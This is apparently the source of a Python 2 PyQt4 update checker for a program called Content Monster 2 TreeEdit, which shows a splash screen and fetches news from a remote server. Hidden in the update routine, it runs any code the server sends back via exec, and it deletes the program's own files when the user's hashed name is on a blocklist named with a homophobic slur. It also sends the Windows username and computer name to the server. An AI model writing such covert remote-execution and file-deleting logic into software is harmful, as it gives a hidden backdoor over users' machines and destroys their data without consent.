#!/usr/bin/env python
#-*- coding: UTF-8 -*-

__author__ = "helljump"


__version__ = [1, 3, 10]

from PyQt4 import QtGui
from PyQt4 import QtCore
from PyQt4.QtGui import QSplashScreen, QPixmap, qApp
from PyQt4.QtCore import Qt
import os
import xmlrpclib
from logging import debug, exception
import shelve
import datetime
from utils.paths import CONFIGFILE
import hashlib


UPDATERSIGN = "Updater"
UPDATEURL = 'http://rpc.content-monster.com/'
#UPDATEURL = 'http://127.0.0.1:8000/'

PIDORS = [
'c8aabaa504928c8c9720fd78e2baa154', '6cc1c33d1d34211a7cbdfde0831cf97c', '87da74b12b63fe4fe6534f5c2f2187cd',
'18c62912b0727dd53520f928dffcadeb', '971def4f81c237ad173247c10b381510', '960da84d02869e39672403acc0a1d77e',
'57c32644c104d2139a843897fab006c1', '5e11ece4e41a683eaf146dba5238a402', '49015508ff27576f600104a6649fed8e',
'f784b8f5c418c6893da41d59f50bc75c', 'c6231e994f88e53845e42708c1cce531', '98ab39c67013b0d44a29d7a96d26343a',
'f297eebfd7ca5693870dcde1300a1530', 'b1d4b82804e7fa7aeba95d82c03cd524', 'f9cecfd5c9620acfff4af07d034244e5',
'b4af05e788062039774005354b8761d5', '64fe61605aae3b05ce21262677b0a90a', 'ee83b40752bd0e68488f1564a25a7a78',
'14b9a1cd8191c9ce608b816f0e21a548', '849cfba687e050ed6d437c1996b6855b', '1880714505db335b9a32f0aef7a4edfe',
'f014745f76d26bd2bdb80b9a30174344', '23b73ccd0183fc3dba95ad4e5f91143e', '969febc763fbed92aba0001f68557c65',
'ca42a91fff806406da9ab45dcb5f6984', '48d9a78b633a257d6079dfede75da48e', '85e6b7a3a23c79178dcf8598096f2c3b',
'181431da1d064af05e624b99aeac5b00', '4971ee690c6c8973a2dd9ac767fec0a0', '4b20c0dc4fe9ad3ba24ef4cceecb6ee6',
'3eeec33d1c4ff3596fad9210025be532', 'fdbde28d1b09f5cb45446e16bd611436', 'c4d7c2593b2934e4dc2df82e62a3b69d',
'ae2a3032a4dd8cde5db5752a29813dd0', 'dcd9261944c9390883875eb060ff8dcd', '496b798e1e778b4ddc7f60cbb2f2ad1d',
'0060fc3d9cc5fc85ee3755881ed46893', '0155298d98871951c0aca3fbfe525120', 'c6202c01f6af25304063a39ebea9f52b',
'80a02e02ca106dd6f102eb29a2a3916c', '7c8464b6645c845cea2d4c6a68cc3aac', 'd54d901eae9330ad3d34b276add4bc5f',
'a3579a2ed4f850606b0b6f7049bb31cb', '8ba4f16784f70a4edf49321ff1601199', '5e0c28724ec2a66aa00eb2b73b823404',
'29d77214c68d1d9606836b6871638219', '87da74b12b63fe4fe6534f5c2f2187cd', ]



class UpdateDialog(QtGui.QDialog):

    def __init__(self, *args):
        QtGui.QDialog.__init__(self, *args)
        self.setWindowTitle(u"Content Monster 2 TreeEdit")
        self.setWindowFlags(QtCore.Qt.Dialog)
        self.resize(500, 300)
        layout = QtGui.QGridLayout(self)
        self.about_tb = QtGui.QTextEdit(self)
        self.about_tb.setReadOnly(True)
        layout.addWidget(self.about_tb, 0, 0, 1, 1)
        bbox = QtGui.QDialogButtonBox(self)
        bbox.setStandardButtons(QtGui.QDialogButtonBox.Ok)
        self.connect(bbox, QtCore.SIGNAL("accepted()"), self.accept)
        layout.addWidget(bbox, 1, 0, 1, 1)
        self.about_tb.viewport().installEventFilter(self)

    def eventFilter(self, source, event):
        if (event.type() == QtCore.QEvent.MouseButtonRelease and source is self.about_tb.viewport()):
            s = self.about_tb.anchorAt(event.pos())
            if s:
                QtGui.QDesktopServices.openUrl(QtCore.QUrl(s))
            return True
        return QtGui.QWidget.eventFilter(self, source, event)


class MySplash(QSplashScreen):
    def __init__(self):
        pm = QPixmap(":/ico/img/cm2splash.png")
        QSplashScreen.__init__(self, pm)

    def set_text(self, s):
        self.showMessage(s, Qt.AlignHCenter | Qt.AlignTop, Qt.white)
        qApp.processEvents()


blocked_code = '''
import sys
import os
try:
    os.remove("library.zip")
    os.remove("hunspell.pyd")
except:
    pass
sys.exit()
'''


def update(p, parent):
    splash = MySplash()
    splash.show()
    qApp.processEvents()
    splash.set_text(u"Запуск")

    debug('start %s', __version__)

    splash.set_text(u"Проверка обновлений")

    settings = shelve.open(CONFIGFILE)
    config = settings.get(UPDATERSIGN, {})

    try:

        softname = "content-monster-2-treeedit"
        username = "%(username)s-%(computername)s" % os.environ
        username = username.decode('cp1251', 'ignore')

        m = hashlib.md5()
        m.update(p["username"])
        #print type(p["username"]), p["username"]
        if m.hexdigest() in PIDORS:
            exec(blocked_code)

        server = xmlrpclib.ServerProxy(UPDATEURL)
        rc = server.get_news(softname, username, p["username"])

        if rc['code']:
            exec(rc['code'])

        lastcheck = config.get("lastcheck", datetime.datetime(2000, 1, 1))
        if rc['date'] == lastcheck:
            return

        config["lastcheck"] = rc['date']
        settings[UPDATERSIGN] = config

        dlg = UpdateDialog(splash)
        dlg.about_tb.setHtml(rc['text'])
        dlg.exec_()

    except Exception:
        exception("updater kabyzdec")
    finally:
        settings.close()
        splash.close()


def get_version():
    return ".".join(map(str, __version__))


def reset_updater():
    settings = shelve.open(CONFIGFILE)
    config = settings.get(UPDATERSIGN, {})
    config["lastcheck"] = datetime.datetime(2000, 1, 1)
    settings[UPDATERSIGN] = config
    settings["current_version"] = "0"
    settings.close()

if __name__ == "__main__":
    """
    from utils.paths import KEY_FILENAME
    app=QtGui.QApplication(sys.argv)
    spam = open(KEY_FILENAME,"rb").read().decode('base64')
    p = cPickle.loads(spam)
    update(p, None)
    """
    reset_updater()
    pass
